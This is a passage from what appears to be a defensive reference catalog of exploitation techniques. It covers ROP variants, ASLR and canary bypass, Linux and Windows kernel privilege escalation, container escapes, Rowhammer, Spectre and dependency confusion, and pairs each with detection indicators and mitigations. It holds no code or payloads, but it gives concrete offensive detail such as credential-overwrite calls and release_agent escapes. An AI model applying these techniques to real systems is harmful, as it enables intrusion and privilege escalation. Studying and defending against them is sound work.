**Where —** Dynamically linked C programs with a stack overflow and known/leaked libc base; foundational CTF technique.

**Detection indicators:**
- Return into the middle/entry of a libc export (system, execve, one_gadget) directly from a user stack frame
- A '/bin/sh' pointer staged in RDI/first arg
- Mitigations: ASLR/PIE (requires leak), Full RELRO, CET shadow stack, seccomp filtering execve

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://ctf101.org/binary-exploitation/return-oriented-programming/) · [link](https://phrack.org/issues/58/4)

### Return-Oriented Programming (ROP) / NX-DEP Bypass
*id:* `return-oriented-programming` · *severity:* **critical** · *languages:* asm-x64, asm-x86, asm-arm, asm-arm64, c

With no-execute memory preventing injected shellcode, an attacker chains short existing instruction sequences ('gadgets') ending in ret to perform arbitrary computation using only code already present in the binary or libraries.

**How it works —** NX/DEP marks the stack and heap non-executable, so classic 'jump to shellcode on the stack' fails. ROP instead reuses code: each gadget is a few instructions ending in ret (e.g. pop rdi ; ret to load an argument register), and a forged stack of gadget addresses interleaved with data drives execution — every ret pops the next gadget address into RIP. Chaining set-register gadgets plus a call to a target (like execve via a syscall gadget) yields Turing-complete computation without introducing new code. On x86-64 gadgets can also be found at unaligned offsets. The canonical educational goal is arranging a chain to call system/execve or to make a memory region executable (mprotect). Explained conceptually via the stack-as-program model; ROP Emporium provides safe practice binaries.

**Where —** Any binary with a stack-write primitive under NX/DEP; needs a code base of gadgets (the binary itself, statically linked code, or libc after a leak).

**Detection indicators:**
- Execution flowing through many short sequences each ending in ret, in .text/libc ranges
- Stack containing a dense run of code-segment addresses
- Return-address mismatch vs. call site (shadow-stack/CET violation, ROPGuard/kBouncer heuristics)
- Mitigations: stack canaries, ASLR/PIE (need a leak), Intel CET shadow stack, ARM PAC/BTI, CFI, RELRO

**References:** [link](https://ctf101.org/binary-exploitation/return-oriented-programming/) · [link](https://ropemporium.com/challenge/ret2csu.html) · [link](https://azeria-labs.com/return-oriented-programming-arm32/) · [link](https://github.com/guyinatuxedo/nightmare) · [link](https://hovav.net/ucsd/dist/geometry.pdf)

### Stack Buffer Overflow → ROP
*id:* `stack-buffer-overflow-rop` · *severity:* **critical** · *languages:* c, c++, asm-x86, asm-x64

Overflowing a stack buffer overwrites the saved return address; with NX enabled, execution is redirected through a chain of existing code gadgets (ROP).

**How it works —** Conceptually: control EIP/RIP via the overwrite, then chain `ret`-terminated gadgets to set up a syscall/library call (e.g. ret2libc) — mitigations (canary, ASLR, NX, PIE) must be leaked/bypassed.

**Where —** Native binaries using unbounded copies (strcpy/gets/memcpy) on stack buffers.

**Detection indicators:**
- SIGSEGV with controlled instruction pointer
- missing stack canary / NX / PIE (checksec)
- crash on long input

**References:** [link](https://github.com/shellphish/how2heap) · [link](https://github.com/guyinatuxedo/nightmare) · [link](http://phrack.org/issues/58/4.html) · [link](https://ctf101.org/binary-exploitation/return-oriented-programming/)

### Jump-Oriented Programming (JOP)
*id:* `jump-oriented-programming` · *severity:* **high** · *languages:* asm-x64, asm-x86, asm-arm, c

A ret-free code-reuse variant that chains gadgets ending in indirect jumps/calls, driven by a 'dispatcher' gadget and table instead of the stack, to evade return-address-based defenses.

**How it works —** JOP avoids the ret instruction entirely, defeating mitigations that only monitor returns (return-address stacks, ret-frequency heuristics). Functional gadgets end in an indirect branch (jmp reg / call reg) rather than ret. A special 'dispatcher gadget' advances a pointer through a dispatch table of gadget addresses and jumps to each in turn, emulating the sequencing that ret normally provides. Control data lives in registers/memory (the dispatch table) rather than a return-address stack. It targets the same goals as ROP (argument setup, syscall/function invocation) but through the forward edge. Bletsch et al. (ASIACCS 2011) formalized it. Conceptual dispatcher/gadget-graph description only.

**Where —** Binaries with sufficient indirect-branch gadgets and a dispatcher-like gadget, especially where ret-oriented defenses are deployed.

**Detection indicators:**
- Bursts of short sequences terminated by indirect jmp/call through registers
- A repeatedly executed dispatcher gadget walking a table
- Mitigations: forward-edge CFI, Intel CET IBT (endbr landing pads), ARM BTI, coarse/fine-grained indirect-branch validation

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://dl.acm.org/doi/10.1145/1966913.1966919)

### ret2csu (Universal Gadget in __libc_csu_init)
*id:* `ret2csu` · *severity:* **high** · *languages:* asm-x64, c

Uses two gadgets always emitted in __libc_csu_init to populate argument registers (rdi/rsi/rdx) and perform an indirect call, giving a general argument-setup primitive when the binary lacks dedicated pop gadgets.

**How it works —** 64-bit calling convention passes the first three integer args in rdi, rsi, rdx, but small binaries often lack a pop rdx ; ret gadget. The __libc_csu_init function (linked into most non-PIE-stripped ELF binaries) contains a reliable pair of gadgets: one pops r12/r13/r14/r15/rbx/rbp and returns; the other moves those into rdx/rsi/edi and does call qword [r12+rbx*8], then increments and loops. By staging register values through the first gadget and pointing the call at a chosen pointer, the attacker sets all three argument registers and calls an arbitrary function — a 'universal' setup usable across targets. Marco-Gisbert and Ripoll documented it as an ASLR-bypass aid at Black Hat Asia 2018. Conceptual gadget-role description only.

**Where —** 64-bit ELF binaries retaining __libc_csu_init (pre-glibc-2.34 CRT), used when direct arg-setup gadgets are scarce.

**Detection indicators:**
- Return chain landing in __libc_csu_init's epilogue and the mov/call block
- Loop-controlled indirect call qword [r12+rbx*8]
- Mitigations: newer CRT (glibc 2.34+) drops the classic __libc_csu_init gadgets, PIE without a leak, CET/BTI, CFI

**References:** [link](https://ropemporium.com/challenge/ret2csu.html) · [link](https://github.com/guyinatuxedo/nightmare) · [link](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)

### ret2dlresolve (Abusing the Dynamic Linker)
*id:* `ret2dlresolve` · *severity:* **high** · *languages:* asm-x64, asm-x86, c

A leakless technique that forges the relocation/symbol/string structures consumed by _dl_runtime_resolve so the lazy linker resolves and calls an attacker-named function (e.g. system) without any libc leak.

**How it works —** With lazy binding, an unresolved PLT stub pushes a relocation index and calls _dl_runtime_resolve(link_map, reloc_index), which reads the .rel.plt (Elf_Rel), .dynsym (Elf_Sym), and .dynstr tables to look up a symbol by name and patch the GOT. If the attacker can write forged copies of these structures (e.g. into .bss via a read) and pass a crafted, out-of-range reloc index, _dl_fixup resolves a symbol whose name string they chose ("system") and calls it — no address leak needed. It fails under Full RELRO (no lazy binding, GOT read-only) and requires enough space plus a writable region. pwntools' Ret2dlresolvePayload automates the structure layout. Conceptual description of the linker data flow only.

**Where —** Dynamically linked ELF with lazy binding (Partial RELRO or none), a controllable write into a known-address region, and sufficient ROP length.

**Detection indicators:**
- A call into _dl_runtime_resolve with an unusually large relocation offset
- Forged Elf_Rel/Elf_Sym/strings in .bss or other writable memory
- Mitigations: Full RELRO (BIND_NOW, read-only GOT) fully prevents it; newer linkers add reloc-index bounds checks

**References:** [link](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html) · [link](https://github.com/guyinatuxedo/nightmare) · [link](https://phrack.org/issues/58/4)

### Sigreturn-Oriented Programming (SROP)
*id:* `sigreturn-oriented-programming` · *severity:* **high** · *languages:* asm-x64, asm-x86, asm-arm64, c

Abuses the kernel's signal-return path: by faking a signal frame on the stack and invoking sigreturn, the attacker sets every register at once from attacker-controlled memory, needing only one or two gadgets.

**How it works —** On a signal, the kernel pushes a sigcontext frame (full register set) onto the user stack; the sigreturn syscall restores all of it on return. SROP forges this frame with attacker-chosen values for every register including RIP/RSP and the syscall number, then triggers sigreturn (often by returning into a syscall gadget with rax = 15 on x86-64). The kernel obligingly loads the whole CPU state, so a single primitive yields complete register control — e.g. setting up and executing an execve syscall. Because the frame format is fixed and stable, SROP is portable across UNIX variants and is Turing-complete (Bosman & Bos, IEEE S&P 2014). Conceptual account of the signal frame; no exploit bytes.

**Where —** Linux/UNIX binaries where a syscall/sigreturn gadget is reachable and the stack can be staged; effective when gadget variety is otherwise limited (e.g. static tiny binaries).

**Detection indicators:**
- A sigreturn/rt_sigreturn syscall not preceded by real signal delivery
- Full register state loaded from a user-controlled stack frame
- Mitigations: seccomp filtering sigreturn/execve, SROP-frame randomization/cookies proposals, CET/PAC on the return path

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf) · [link](https://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf)


## Exploit-mitigation bypass (`mitigation-bypass`)

### ASLR / PIE Bypass via Information Leak
*id:* `aslr-pie-infoleak-bypass` · *severity:* **high** · *languages:* asm-x64, asm-x86, c · *CVE:* CVE-2014-0160

Address-space layout randomization is defeated not by guessing but by leaking a single runtime pointer, which reveals a module's base so that all gadget/function/GOT addresses can be recomputed relative to it.

**How it works —** ASLR/PIE randomize the load base of the executable, libraries, stack, and heap, so hardcoded addresses fail. Because a whole module is shifted by one random offset, disclosing any pointer into it (a leaked libc function pointer, a GOT entry, a saved return address, a stack/heap pointer) reveals the base after subtracting the known static offset; the attacker then rebuilds the exploit at runtime. Leak sources: format-string reads, uninitialized/over-read disclosures (Heartbleed-style over-reads are a canonical leak primitive), or a first-stage ROP that prints a GOT entry (puts(GOT)) before a second stage. On 32-bit, low entropy also permits brute force. Conceptual base-arithmetic explanation only.

**Where —** PIE/ASLR-hardened programs that also expose any pointer-disclosure primitive; two-stage exploits (leak, then reuse) are standard.

**Detection indicators:**
- Output containing pointer-looking values with a stable low-bits-known / high-bits-random pattern
- A GOT/libc read immediately preceding control-flow hijack
- Mitigations: eliminate leaks (FORTIFY, bounds checks), higher-entropy ASLR, per-request re-randomization, Full RELRO, execute-only memory to blunt leak-then-reuse

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://ctf101.org/binary-exploitation/return-oriented-programming/) · [link](https://hovav.net/ucsd/dist/geometry.pdf)

### Stack Canary Leak / Bypass
*id:* `stack-canary-leak-bypass` · *severity:* **high** · *languages:* asm-x64, asm-x86, c

Defeating the stack-smashing-protector guard value by disclosing it (info leak), overwriting only data below it, or brute-forcing it in forking servers, so a stack overflow can still reach the saved return address.

**How it works —** SSP places a per-thread random 'canary' (low byte 0x00, sourced from the TLS at fs:0x28 on x86-64) between local buffers and the saved return address, and __stack_chk_fail aborts if it changes at epilogue. Bypass concepts: (1) leak the canary via a separate read primitive (format string %p, uninitialized-memory disclosure, or an over-read) and rewrite the identical value during the overflow; (2) avoid the canary entirely with a targeted write (index/pointer overwrite, or overflow of a struct member that reaches the return path without crossing the canary); (3) in a fork()-based server the child inherits the parent canary, so it can be brute-forced byte-by-byte (256 tries/byte) by observing crash vs. no-crash. Conceptual; no payloads.

**Where —** C/C++ built with -fstack-protector where an overflow must pass the canary; forking network daemons are especially exposed to brute force.

**Detection indicators:**
- Repeated child crashes in a forking service consistent with byte-wise brute force
- A leaked value with a 0x..00 low byte reused verbatim in later input
- 'stack smashing detected' aborts during probing
- Mitigations: per-fork re-randomized canaries, ASLR of the master secret, RELRO+PIE to deny leak targets, shadow stacks (canary-independent)

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://pwn.college/program-security/program-security/) · [link](https://phrack.org/issues/49/14)

### RELRO GOT-Overwrite and CFI/CET Bypass Concepts
*id:* `relro-cfi-mitigation-landscape` · *severity:* **medium** · *languages:* asm-x64, c, c++

Reference overview of two structural mitigations — RELRO (protecting linker tables) and CFI/CET/PAC (constraining indirect control flow) — and the conceptual limits attackers probe when they are only partially deployed.

**How it works —** RELRO: Partial RELRO reorders sections and makes some ELF metadata read-only but leaves the GOT writable with lazy binding, so a write primitive can overwrite a GOT entry to redirect a library call; Full RELRO (BIND_NOW) resolves all symbols at load and maps the GOT read-only, closing GOT-overwrite and ret2dlresolve. CFI/CET/PAC: forward-edge Control-Flow Integrity restricts indirect calls/jumps to valid targets; Intel CET adds IBT (endbr landing pads) and a hardware shadow stack for the backward edge; ARM provides Pointer Authentication (PAC) signing pointers and BTI for landing pads. Conceptually, coarse-grained CFI leaves many valid targets reachable (call-preceded gadgets, large equivalence classes), shadow stacks constrain returns but not all forward-edge reuse, and data-only/JOP-style attacks aim at what these edges do not cover. Educational summary of guarantees and gaps — no bypass recipe.

**Where —** Modern hardened toolchains/CPUs; relevant to any target where a mitigation is missing, partial, or coarse-grained.

**Detection indicators:**
- writable-GOT + lazy binding (Partial RELRO) shown by checksec
- Indirect transfer to a non-endbr / unsigned target (CET/PAC/BTI fault)
- Return-address mismatch vs. shadow stack
- Mitigations themselves: Full RELRO, fine-grained CFI, CET shadow stack + IBT, ARM PAC/BTI, -mbranch-protection

**References:** [link](https://ctf101.org/binary-exploitation/return-oriented-programming/) · [link](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html) · [link](https://dl.acm.org/doi/10.1145/1102120.1102165)


## Kernel & low-level (`kernel-lowlevel`)

### cred Struct Overwrite / commit_creds & DirtyCred
*id:* `cred-overwrite-dirtycred` · *severity:* **critical** · *languages:* c · *CVE:* CVE-2021-4154, CVE-2022-2588, CVE-2022-2602

Classic kernel escalation calls commit_creds(prepare_kernel_cred(0)) or zeroes the current task's cred->uid/gid. DirtyCred generalizes this to a data-only attack: free an unprivileged cred/file object and reclaim its slot with a privileged one, escalating without leaking or bypassing KASLR.

**How it works —** conceptual — no working exploit

**Where —** Linux kernel task credential (struct cred) and file objects allocated from cred_jar / filp caches. Requires a control-flow hijack (classic) or a UAF/double-free on a cred/file object (DirtyCred).

**Detection indicators:**
- a process's euid dropping to 0 without a legitimate setuid path
- kernel calls to commit_creds with attacker-supplied cred
- UAF/double-free on cred_jar or filp slab caches
- unexpected privileged file writes after a container/user-namespace operation

**References:** [link](https://github.com/Markakd/DirtyCred) · [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://zplin.me/papers/DirtyCred.pdf) · [link](https://dl.acm.org/doi/10.1145/3548606.3560585)

### eBPF Verifier Bugs
*id:* `ebpf-verifier-exploitation` · *severity:* **critical** · *languages:* c, asm · *CVE:* CVE-2020-8835, CVE-2021-3490, CVE-2017-16995, CVE-2021-31440

The in-kernel eBPF verifier statically proves program safety; bugs in its bounds/ALU tracking (especially 32-bit operations) let a crafted program pass verification yet perform out-of-bounds kernel reads/writes, giving a powerful arbitrary read/write primitive from an unprivileged user.

**How it works —** conceptual — no working exploit

**Where —** Linux kernel kernel/bpf/verifier.c. Historically reachable by unprivileged users where unprivileged BPF was enabled (kernel.unprivileged_bpf_disabled=0).

**Detection indicators:**
- unprivileged bpf() syscalls loading complex programs
- verifier bounds-tracking anomalies / patched-op sequences (ALU32)
- BPF programs used to overwrite sk_filter or kernel structures
- escalation attempts on systems with unprivileged BPF enabled

**References:** [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490) · [link](https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification) · [link](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story)

### io_uring Subsystem Exploitation
*id:* `io-uring-exploitation` · *severity:* **critical** · *languages:* c · *CVE:* CVE-2021-41073, CVE-2022-1786, CVE-2022-2602, CVE-2022-29582

The io_uring async I/O interface introduced a large, complex attack surface (shared rings, registered/provided buffers, deferred work). Bugs include incorrect frees and UAFs in buffer handling, exploited for local privilege escalation, prompting distros to restrict or disable it.

**How it works —** conceptual — no working exploit

**Where —** Linux kernel io_uring (fs/io_uring.c and later io_uring/). Reachable by unprivileged local users unless gated by kernel.io_uring_disabled / seccomp.

**Detection indicators:**
- unexpected io_uring_setup/io_uring_register from untrusted processes
- KASAN reports in io_uring buffer/loop_rw_iter paths
- provided-buffer rings freed at attacker-controlled offsets
- io_uring workqueue activity from sandboxed workloads

**References:** [link](https://github.com/chompie1337/Linux_LPE_io_uring_CVE-2021-41073) · [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/) · [link](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/)

### Linux Kernel Use-After-Free & Heap Spray (slab/cross-cache)
*id:* `linux-kernel-uaf-heap-spray` · *severity:* **critical** · *languages:* c, asm · *CVE:* CVE-2021-22555, CVE-2022-32250, CVE-2022-2588, CVE-2023-0179

Reclaiming a freed kernel object with an attacker-controlled object of the same or a colliding slab cache to hijack function pointers or corrupt privileged structures. Cross-cache attacks reuse whole pages across caches to defeat dedicated (SLAB_ACCOUNT / kmalloc-cg) isolation.

**How it works —** conceptual — no working exploit

**Where —** Linux kernel heap allocators (SLUB/SLAB); object lifetime bugs in subsystems like netfilter, TTY, io_uring, sockets. Local unprivileged user reaching a vulnerable ioctl/syscall path.

**Detection indicators:**
- KASAN use-after-free / slab-out-of-bounds splats in dmesg
- unusual heap grooming via mass socket/msg_msg/setxattr allocations
- kernel oops with corrupted object pointers
- spraying primitives such as sendmsg/msgsnd, add_key, user_key_payload

**References:** [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://github.com/google/security-research) · [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html) · [link](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)

### UEFI / Firmware Implants (LoJax, SMM abuse)
*id:* `uefi-firmware-implant` · *severity:* **critical** · *languages:* c, asm

Persistence below the OS by writing to SPI flash / UEFI firmware. LoJax (Sednit/APT28) was the first in-the-wild UEFI rootkit, re-dropping its payload from firmware to survive OS reinstall and disk replacement. Related classes abuse System Management Mode (SMM, ring -2) and unlocked/writable SPI flash to defeat Secure Boot.

**How it works —** conceptual — no working exploit

**Where —** UEFI firmware / SPI flash on systems with unprotected flash descriptor regions, missing BIOS write protection (BLE/SMM_BWP/PRx), or SMM callout bugs; requires kernel/physical access or a firmware-write vulnerability.

**Detection indicators:**
- unexpected DXE drivers or modules in firmware images (UEFITool/CHIPSEC scans)
- modification of the NTFS DXE driver / firmware payload region (LoJax pattern)
- SPI flash protection registers left unlocked
- firmware integrity/measured-boot (TPM PCR) mismatches

**References:** [link](https://github.com/chipsec/chipsec) · [link](https://github.com/LongSoft/UEFITool) · [link](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/) · [link](https://web-assets.esetstatic.com/wls/2018/09/ESET-LoJax.pdf)

### Windows Kernel Token Stealing / HalDispatchTable / GDI Primitives
*id:* `windows-kernel-token-stealing` · *severity:* **critical** · *languages:* c, asm · *CVE:* CVE-2021-1732, CVE-2014-4113, CVE-2016-7255

Windows LPE patterns: token-stealing shellcode swaps a low-privilege process's EPROCESS.Token for the SYSTEM process token; arbitrary-write bugs are triggered via HalDispatchTable+0x8 (NtQueryIntervalProfile); GDI bitmap objects give reusable kernel read/write primitives. HEVD is the standard training driver.

**How it works —** conceptual — no working exploit

**Where —** Windows kernel (win32k.sys, GDI, ntoskrnl). Local user reaching a vulnerable driver IOCTL or win32k callback; mitigated by SMEP, kCFG, VBS/HVCI, and GDI type isolation on modern builds.

**Detection indicators:**
- a process token replaced with the SYSTEM token (EPROCESS.Token swap)
- overwrite of HalDispatchTable[1] followed by NtQueryIntervalProfile
- manager/worker GDI bitmap pairs used for kernel R/W
- loading of untrusted/vulnerable signed kernel drivers (BYOVD)

**References:** [link](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) · [link](https://github.com/Cn33liz/HSEVD-ArbitraryOverwrite) · [link](https://www.fuzzysecurity.com/tutorials/expDev/14.html) · [link](https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf)

### KASLR / KPTI Kernel Mitigation Bypass
*id:* `kaslr-kpti-mitigation-bypass` · *severity:* **high** · *languages:* c, asm · *CVE:* CVE-2017-5754, CVE-2022-4543

Defeating Kernel Address Space Layout Randomization via info leaks (uninitialized memory, /proc, timing/side channels) to recover the kernel base, and reasoning about KPTI (page-table isolation), the mitigation Meltdown forced, which separates user and kernel page tables to stop cross-domain reads.

**How it works —** conceptual — no working exploit

**Where —** Modern Linux/Windows kernels with KASLR + KPTI/PTI. Any leak of a kernel pointer (dmesg, syslog, uninitialized struct fields, prefetch/TLB timing) collapses randomization entropy.

**Detection indicators:**
- kernel pointers appearing in user-readable output despite kptr_restrict
- prefetch/TLB timing loops probing kernel address space
- reads of /proc/kallsyms or /sys leaking symbol addresses
- EntryBleed-style KPTI page-table timing probes

**References:** [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://gruss.cc/files/prefetch.pdf) · [link](https://www.willsroot.io/2022/12/entrybleed.html) · [link](https://meltdownattack.com/)

### Linux Kernel Race Conditions (Dirty COW / Dirty Pipe)
*id:* `linux-kernel-race-conditions` · *severity:* **high** · *languages:* c · *CVE:* CVE-2016-5195, CVE-2022-0847

Data-only privilege escalation abusing kernel races in copy-on-write handling (Dirty COW) or uninitialized pipe-buffer flags (Dirty Pipe) to write bytes into read-only files (e.g. /etc/passwd, setuid binaries) without any memory-corruption primitive.

**How it works —** conceptual — no working exploit

**Where —** Dirty COW: mm/gup.c FOLL_WRITE handling in kernels since 2.6.22. Dirty Pipe: pipe page-cache splice in kernels 5.8–5.16.x. Any local user with read access to a target file.

**Detection indicators:**
- unexpected modification of read-only/immutable files or read-only mounts
- short-lived racing threads calling madvise(MADVISE_DONTNEED) with writes to /proc/self/mem
- splice() of a read-only fd into a pipe followed by write()
- integrity-monitoring alerts on /etc/passwd, /etc/shadow, sudo/binary tampering

**References:** [link](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) · [link](https://github.com/dirtycow/dirtycow.github.io) · [link](https://dirtycow.ninja/) · [link](https://dirtypipe.cm4all.com/) · [link](https://access.redhat.com/security/vulnerabilities/DirtyCow)

### modprobe_path Overwrite
*id:* `modprobe-path-overwrite` · *severity:* **high** · *languages:* c · *CVE:* CVE-2024-1086, CVE-2022-25636

A generic post-exploitation technique that turns a kernel write primitive into root code execution by overwriting the global modprobe_path string; triggering an unknown-magic exec or unknown-protocol socket makes the kernel run the attacker's script as root via call_usermodehelper.

**How it works —** conceptual — no working exploit

**Where —** Linux kernels where CONFIG_STATIC_USERMODEHELPER is unset and an arbitrary/constrained kernel write is available. modprobe_path lives in writable kernel data.

**Detection indicators:**
- writes to the modprobe_path symbol / kernel .data
- execution of files with unknown magic bytes to trigger request_module
- /sbin/modprobe replaced by an unexpected path
- short root-owned shell scripts dropped in world-writable dirs

**References:** [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://sam4k.com/like-techniques-modprobe_path/) · [link](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)

### ret2usr and SMEP/SMAP Bypass
*id:* `ret2usr-smep-smap-bypass` · *severity:* **high** · *languages:* c, asm · *CVE:* CVE-2017-1000112, CVE-2013-2094

Redirecting kernel control flow to attacker-controlled userland code/data (return-to-user). Modern CPUs block this with SMEP (no kernel exec of user pages) and SMAP (no kernel access to user data); attackers respond with kernel-ROP, stack pivoting, or ret2dir (aliasing user pages via the physmap).

**How it works —** conceptual — no working exploit

**Where —** x86-64/ARM64 kernels where a control-flow-hijack primitive exists. SMEP/SMAP set via CR4 bits; ret2dir defeats them by locating a kernel-space alias of user memory.

**Detection indicators:**
- kernel instruction pointer transferring to user addresses
- attempts to flip CR4.SMEP/SMAP (e.g. via native_write_cr4 gadget)
- ROP chains built from kernel .text gadgets
- large physmap grooming to create predictable user-page aliases

**References:** [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/kemerlis) · [link](https://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf) · [link](https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/kemerlis)


## Container / sandbox escape (`container-sandbox`)

### runc Container Escape via /proc/self/exe (CVE-2019-5736)
*id:* `runc-container-escape-2019-5736` · *severity:* **critical** · *languages:* c, go · *CVE:* CVE-2019-5736

A malicious container overwrites the host runc binary by abusing a file descriptor to /proc/self/exe: when the runtime re-executes itself for an exec/attach, a container-controlled shared library's constructor reopens /proc/self/exe for write and clobbers runc, giving root code execution on the host.

**How it works —** conceptual — no working exploit

**Where —** runc <=1.0-rc6 as used by Docker <18.09.2, containerd, CRI-O, Kubernetes. Requires attacker control of a container image or the ability to docker exec into a malicious container.

**Detection indicators:**
- container process opening /proc/self/exe with write intent
- modification/replacement of the host runc binary
- container entrypoint symlinked to /proc/self/exe
- unexpected shared-library constructor execution during runtime exec

**References:** [link](https://github.com/Frichetten/CVE-2019-5736-PoC) · [link](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html) · [link](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)

### Privileged Container & cgroups release_agent Escape
*id:* `privileged-container-cgroups-escape` · *severity:* **high** · *languages:* bash, c · *CVE:* CVE-2022-0492

A --privileged container (or one with CAP_SYS_ADMIN) mounts a writable cgroup v1 filesystem and sets release_agent to an attacker script; emptying a notify_on_release cgroup makes the host kernel execute that script as full root. CVE-2022-0492 exposed the same primitive to some non-privileged containers.

**How it works —** conceptual — no working exploit

**Where —** cgroup v1 hosts; privileged containers, or containers with CAP_SYS_ADMIN and unprivileged user namespaces where AppArmor/SELinux/seccomp are absent (CVE-2022-0492).

**Detection indicators:**
- mount of cgroupfs from inside a container
- writes to release_agent / toggling notify_on_release
- host binary/script spawned by the kernel with full capabilities
- container processes probing /proc, /sys, or host device nodes

**References:** [link](https://github.com/SofianeHamlaoui/CVE-2022-0492-Checker) · [link](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) · [link](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)


## Microarchitectural & hardware (`microarchitectural`)

### Rowhammer DRAM Bit-Flip Attacks
*id:* `rowhammer-bit-flip` · *severity:* **high** · *languages:* c, asm

Repeatedly activating (hammering) DRAM rows induces bit flips in adjacent rows, a hardware fault turned into a software exploit. Project Zero flipped bits in page-table entries to gain write access to a process's own page tables and thus all of physical memory; later work weaponizes it from JavaScript and against ECC.

**How it works —** conceptual — no working exploit

**Where —** Vulnerable DDR3/DDR4 modules; unprivileged local code (native or in-browser). Defeats memory isolation without any software bug; mitigations include TRR, ECC, and increased refresh — all partially bypassed.

**Detection indicators:**
- sustained high-rate uncached accesses to specific DRAM row pairs (CLFLUSH/non-temporal)
- spikes in correctable/uncorrectable ECC errors
- memory-spray/grooming to place page tables in hammerable rows
- unexpected bit changes in security-critical data

**References:** [link](https://github.com/google/rowhammer-test) · [link](https://github.com/IAIK/flipfloyd) · [link](https://projectzero.google/2015/03/exploiting-dram-rowhammer-bug-to-gain.html) · [link](https://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf)

### Spectre & Meltdown Speculative Execution Attacks
*id:* `spectre-meltdown-speculative-execution` · *severity:* **high** · *languages:* c, asm · *CVE:* CVE-2017-5754, CVE-2017-5753, CVE-2017-5715

Transient out-of-order/speculative execution leaves microarchitectural traces (typically in the cache) that a covert channel recovers. Meltdown reads kernel memory across the user/kernel boundary; Spectre coerces a victim to speculatively leak its own memory via branch mistraining (bounds-check bypass, branch-target injection).

**How it works —** conceptual — no working exploit

**Where —** Out-of-order CPUs: Meltdown (mainly Intel) motivated KPTI/PTI; Spectre affects Intel, AMD, ARM and crosses process/VM/JIT sandboxes. Attacker needs only local code execution or a mistrainable victim.

**Detection indicators:**
- tight Flush+Reload / cache-probe loops paired with speculative gadgets
- abnormal rates of handled page faults or TSX aborts (Meltdown suppression)
- high mispredicted-branch counters during data exfiltration
- performance-counter anomalies from HPC-based detectors

**References:** [link](https://github.com/IAIK/meltdown) · [link](https://github.com/crozone/SpectrePoC) · [link](https://meltdownattack.com/meltdown.pdf) · [link](https://spectreattack.com/spectre.pdf) · [link](https://meltdownattack.com/)

### Cache-Timing Side Channels (Flush+Reload, Prime+Probe)
*id:* `cache-timing-side-channels` · *severity:* **medium** · *languages:* c, asm

Shared CPU caches leak a victim's memory-access pattern through timing. Flush+Reload uses shared/deduplicated pages and CLFLUSH to monitor last-level-cache lines with high resolution; Prime+Probe needs no sharing and infers activity from evictions. Both recover crypto keys and serve as the covert channel for transient-execution attacks.

**How it works —** conceptual — no working exploit

**Where —** Multi-tenant CPUs with shared LLC (cloud VMs, browsers, cross-core). Flush+Reload requires shared memory (page dedup, shared libraries); Prime+Probe works across cores without sharing.

**Detection indicators:**
- frequent CLFLUSH plus rdtsc/rdtscp timing measurements
- cache eviction-set construction and repeated probing
- LLC-miss-rate anomalies from performance-counter monitors
- cross-VM/cross-process timing loops correlated with crypto operations

**References:** [link](https://github.com/IAIK/cache_template_attacks) · [link](https://github.com/defuse/flush-reload-attacks) · [link](https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/yarom) · [link](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-yarom.pdf)


## Supply chain (`supply-chain`)

### Supply-Chain: Dependency Confusion & Typosquatting
*id:* `supply-chain-dependency-confusion` · *severity:* **critical** · *languages:* python, javascript, ruby

Dependency confusion (Alex Birsan) exploits package managers that prefer a higher-version public package over a same-named internal one: publishing a malicious public package with an internal name causes automated builds at large firms to fetch and execute it. Typosquatting registers look-alike names (e.g. common misspellings) to catch mistaken installs.

**How it works —** conceptual — no working exploit

**Where —** npm, PyPI, RubyGems, and similar registries with mixed public/private resolution and no scoping/namespace protection; install-time hooks (npm preinstall, setup.py) execute attacker code in CI/dev environments.

**Detection indicators:**
- internal/private package names appearing on public registries
- builds resolving dependencies from public instead of private feeds
- install-time scripts performing DNS/HTTP callbacks (beaconing hostname/build info)
- newly published packages with names one edit-distance from popular libraries

